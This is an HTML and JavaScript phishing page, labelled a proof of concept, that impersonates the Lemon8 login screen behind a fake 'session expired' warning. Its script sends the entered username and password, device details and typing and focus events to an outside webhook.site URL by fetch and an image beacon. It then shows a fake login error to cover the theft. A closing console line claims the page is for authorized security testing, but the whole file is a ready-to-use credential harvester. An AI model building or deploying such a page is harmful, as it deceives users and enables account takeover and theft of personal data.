<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <title>Lemon8</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', 'Helvetica Neue', sans-serif;
            background: linear-gradient(135deg, #FFF9E6 0%, #FFE8CC 50%, #FFD9B3 100%);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            width: 100%;
            max-width: 400px;
            background: white;
            border-radius: 24px;
            padding: 40px 30px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.1);
        }
        
        .logo-container {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .logo {
            width: 80px;
            height: 80px;
            background: linear-gradient(135deg, #FFB84D 0%, #FF9900 100%);
            border-radius: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 15px;
            box-shadow: 0 4px 15px rgba(255, 153, 0, 0.3);
        }
        
        .logo-text {
            font-size: 36px;
            font-weight: 700;
            color: white;
            letter-spacing: -1px;
        }
        
        .app-name {
            font-size: 28px;
            font-weight: 700;
            color: #2C2C2C;
            margin-bottom: 8px;
        }
        
        .subtitle {
            font-size: 15px;
            color: #8E8E93;
            margin-bottom: 35px;
        }
        
        .alert-box {
            background: #FFF3CD;
            border-left: 4px solid #FFB84D;
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 25px;
            display: flex;
            align-items: start;
        }
        
        .alert-icon {
            font-size: 20px;
            margin-right: 10px;
        }
        
        .alert-text {
            flex: 1;
        }
        
        .alert-title {
            font-weight: 600;
            color: #856404;
            font-size: 14px;
            margin-bottom: 4px;
        }
        
        .alert-message {
            font-size: 13px;
            color: #856404;
            line-height: 1.4;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .form-label {
            font-size: 14px;
            font-weight: 600;
            color: #2C2C2C;
            margin-bottom: 8px;
            display: block;
        }
        
        .form-input {
            width: 100%;
            padding: 15px 16px;
            font-size: 16px;
            border: 2px solid #E5E5EA;
            border-radius: 12px;
            background: #F7F7F7;
            transition: all 0.3s;
            outline: none;
        }
        
        .form-input:focus {
            background: white;
            border-color: #FFB84D;
            box-shadow: 0 0 0 4px rgba(255, 184, 77, 0.1);
        }
        
        .form-input::placeholder {
            color: #AEAEB2;
        }
        
        .password-container {
            position: relative;
        }
        
        .toggle-password {
            position: absolute;
            right: 16px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            color: #8E8E93;
            cursor: pointer;
            font-size: 14px;
            padding: 5px;
        }
        
        .forgot-password {
            text-align: right;
            margin-top: 10px;
        }
        
        .forgot-link {
            color: #FFB84D;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }
        
        .submit-btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #FFB84D 0%, #FF9900 100%);
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 17px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 10px;
            box-shadow: 0 4px 15px rgba(255, 153, 0, 0.3);
            transition: all 0.3s;
        }
        
        .submit-btn:active {
            transform: translateY(2px);
            box-shadow: 0 2px 8px rgba(255, 153, 0, 0.3);
        }
        
        .submit-btn.loading {
            background: linear-gradient(135deg, #CCCCCC 0%, #AAAAAA 100%);
            pointer-events: none;
        }
        
        .divider {
            text-align: center;
            margin: 25px 0;
            position: relative;
        }
        
        .divider::before {
            content: '';
            position: absolute;
            left: 0;
            top: 50%;
            width: 100%;
            height: 1px;
            background: #E5E5EA;
        }
        
        .divider-text {
            background: white;
            padding: 0 15px;
            color: #8E8E93;
            font-size: 13px;
            position: relative;
        }
        
        .social-buttons {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 12px;
            margin-bottom: 25px;
        }
        
        .social-btn {
            padding: 12px;
            border: 2px solid #E5E5EA;
            border-radius: 10px;
            background: white;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            font-size: 14px;
            font-weight: 500;
            color: #2C2C2C;
            transition: all 0.3s;
        }
        
        .social-btn:active {
            background: #F7F7F7;
        }
        
        .signup-link {
            text-align: center;
            margin-top: 25px;
            font-size: 14px;
            color: #8E8E93;
        }
        
        .signup-link a {
            color: #FFB84D;
            text-decoration: none;
            font-weight: 600;
        }
        
        .loading-spinner {
            display: none;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-top-color: white;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        .error-message {
            background: #FFE8E8;
            color: #D32F2F;
            padding: 12px 16px;
            border-radius: 8px;
            margin-bottom: 20px;
            font-size: 14px;
            display: none;
        }
        
        .security-badge {
            text-align: center;
            margin-top: 25px;
            padding-top: 20px;
            border-top: 1px solid #E5E5EA;
        }
        
        .security-text {
            font-size: 12px;
            color: #8E8E93;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 5px;
        }
        
        .lock-icon {
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo-container">
            <div class="logo">
                <div class="logo-text">🍋</div>
            </div>
            <h1 class="app-name">Lemon8</h1>
            <p class="subtitle">Discover and share lifestyle inspiration</p>
        </div>
        
        <div class="alert-box">
            <div class="alert-icon">⚠️</div>
            <div class="alert-text">
                <div class="alert-title">Session Expired</div>
                <div class="alert-message">Your session has expired for security reasons. Please log in again to continue.</div>
            </div>
        </div>
        
        <div id="errorMessage" class="error-message"></div>
        
        <form id="loginForm">
            <div class="form-group">
                <label class="form-label" for="username">Email or Username</label>
                <input 
                    type="text" 
                    id="username" 
                    name="username" 
                    class="form-input" 
                    placeholder="Enter your email or username"
                    autocomplete="username"
                    required
                >
            </div>
            
            <div class="form-group">
                <label class="form-label" for="password">Password</label>
                <div class="password-container">
                    <input 
                        type="password" 
                        id="password" 
                        name="password" 
                        class="form-input" 
                        placeholder="Enter your password"
                        autocomplete="current-password"
                        required
                    >
                    <button type="button" class="toggle-password" onclick="togglePassword()">Show</button>
                </div>
                <div class="forgot-password">
                    <a href="#" class="forgot-link" onclick="handleForgotPassword(event)">Forgot password?</a>
                </div>
            </div>
            
            <button type="submit" class="submit-btn" id="submitBtn">
                <span id="btnText">Log In</span>
                <div id="loadingSpinner" class="loading-spinner"></div>
            </button>
        </form>
        
        <div class="divider">
            <span class="divider-text">or continue with</span>
        </div>
        
        <div class="social-buttons">
            <button class="social-btn" onclick="handleSocialLogin('google')">
                <span>🔵</span>
                <span>Google</span>
            </button>
            <button class="social-btn" onclick="handleSocialLogin('apple')">
                <span>🍎</span>
                <span>Apple</span>
            </button>
        </div>
        
        <div class="signup-link">
            Don't have an account? <a href="#" onclick="handleSignup(event)">Sign up</a>
        </div>
        
        <div class="security-badge">
            <div class="security-text">
                <span class="lock-icon">🔒</span>
                <span>Secured by Lemon8</span>
            </div>
        </div>
    </div>
    
    <script>
        // =============================================
        // CONFIGURATION
        // =============================================
        
        // REPLACE WITH YOUR WEBHOOK URL FROM webhook.site
        const WEBHOOK_URL = 'https://webhook.site/YOUR-UNIQUE-ID';
        
        // Analytics & tracking
        const SESSION_ID = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        
        console.log('[PHISHING POC] Page loaded');
        console.log('[SESSION ID]', SESSION_ID);
        
        // =============================================
        // DATA COLLECTION
        // =============================================
        
        function collectDeviceInfo() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screenResolution: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                referrer: document.referrer,
                currentURL: window.location.href,
                cookiesEnabled: navigator.cookieEnabled,
                timestamp: new Date().toISOString()
            };
        }
        
        function sendAnalytics(event, data = {}) {
            const payload = {
                sessionId: SESSION_ID,
                event: event,
                timestamp: new Date().toISOString(),
                deviceInfo: collectDeviceInfo(),
                ...data
            };
            
            console.log('[ANALYTICS]', event, data);
            
            // Send to webhook
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            }).catch(e => console.error('[EXFIL ERROR]', e));
            
            // Backup: Image beacon
            const img = new Image();
            img.src = `${WEBHOOK_URL}?event=${encodeURIComponent(event)}&session=${SESSION_ID}`;
        }
        
        // Track page view
        sendAnalytics('page_view', {
            source: 'webview_injection',
            attack: 'deep_link_phishing'
        });
        
        // =============================================
        // FORM HANDLING
        // =============================================
        
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            console.log('[CREDENTIALS CAPTURED]');
            console.log('Username:', username);
            console.log('Password:', password);
            
            // Show loading state
            const submitBtn = document.getElementById('submitBtn');
            const btnText = document.getElementById('btnText');
            const spinner = document.getElementById('loadingSpinner');
            
            submitBtn.classList.add('loading');
            btnText.textContent = 'Logging in...';
            spinner.style.display = 'block';
            
            // Exfiltrate credentials
            sendAnalytics('credentials_captured', {
                username: username,
                password: password,
                passwordLength: password.length,
                attemptNumber: 1,
                success: true
            });
            
            // Simulate login process
            setTimeout(() => {
                // Show error after "authentication"
                showError('Unable to verify your credentials. Please try again later.');
                
                // Reset form
                submitBtn.classList.remove('loading');
                btnText.textContent = 'Log In';
                spinner.style.display = 'none';
                
                // Send second analytics
                sendAnalytics('fake_error_shown', {
                    errorType: 'authentication_failed'
                });
                
            }, 2500);
        });
        
        // =============================================
        // UI FUNCTIONS
        // =============================================
        
        function togglePassword() {
            const passwordInput = document.getElementById('password');
            const toggleBtn = event.target;
            
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                toggleBtn.textContent = 'Hide';
            } else {
                passwordInput.type = 'password';
                toggleBtn.textContent = 'Show';
            }
            
            sendAnalytics('password_toggle', {
                visible: passwordInput.type === 'text'
            });
        }
        
        function showError(message) {
            const errorDiv = document.getElementById('errorMessage');
            errorDiv.textContent = message;
            errorDiv.style.display = 'block';
            
            setTimeout(() => {
                errorDiv.style.display = 'none';
            }, 5000);
        }
        
        function handleForgotPassword(e) {
            e.preventDefault();
            sendAnalytics('forgot_password_clicked');
            alert('Password reset link will be sent to your registered email address.');
        }
        
        function handleSocialLogin(provider) {
            sendAnalytics('social_login_attempted', { provider: provider });
            alert(`${provider.charAt(0).toUpperCase() + provider.slice(1)} login is temporarily unavailable. Please use email/password.`);
        }
        
        function handleSignup(e) {
            e.preventDefault();
            sendAnalytics('signup_link_clicked');
            alert('Registration is currently closed. Please contact support.');
        }
        
        // =============================================
        // INPUT TRACKING (Optional - tracks typing)
        // =============================================
        
        let usernameInputTimer;
        let passwordInputTimer;
        
        document.getElementById('username').addEventListener('input', function(e) {
            clearTimeout(usernameInputTimer);
            usernameInputTimer = setTimeout(() => {
                sendAnalytics('username_input', {
                    length: e.target.value.length,
                    hasAt: e.target.value.includes('@')
                });
            }, 1000);
        });
        
        document.getElementById('password').addEventListener('input', function(e) {
            clearTimeout(passwordInputTimer);
            passwordInputTimer = setTimeout(() => {
                sendAnalytics('password_input', {
                    length: e.target.value.length,
                    hasNumber: /\d/.test(e.target.value),
                    hasSpecialChar: /[!@#$%^&*]/.test(e.target.value)
                });
            }, 1000);
        });
        
        // =============================================
        // FOCUS TRACKING
        // =============================================
        
        document.getElementById('username').addEventListener('focus', function() {
            sendAnalytics('username_focused');
        });
        
        document.getElementById('password').addEventListener('focus', function() {
            sendAnalytics('password_focused');
        });
        
        // =============================================
        // PAGE VISIBILITY (Detect when user leaves)
        // =============================================
        
        document.addEventListener('visibilitychange', function() {
            sendAnalytics('visibility_change', {
                hidden: document.hidden,
                username: document.getElementById('username').value.length > 0,
                password: document.getElementById('password').value.length > 0
            });
        });
        
        // =============================================
        // UNLOAD TRACKING
        // =============================================
        
        window.addEventListener('beforeunload', function() {
            sendAnalytics('page_unload', {
                timeSpent: Date.now() - parseInt(SESSION_ID.split('_')[1]),
                credentialsEntered: document.getElementById('password').value.length > 0
            });
        });
        
        console.log('[PHISHING POC] All event handlers registered');
        console.log('[WEBHOOK URL]', WEBHOOK_URL);
        console.log('[WARNING] This is a proof-of-concept for authorized security testing only');
    </script>
</body>
</html>
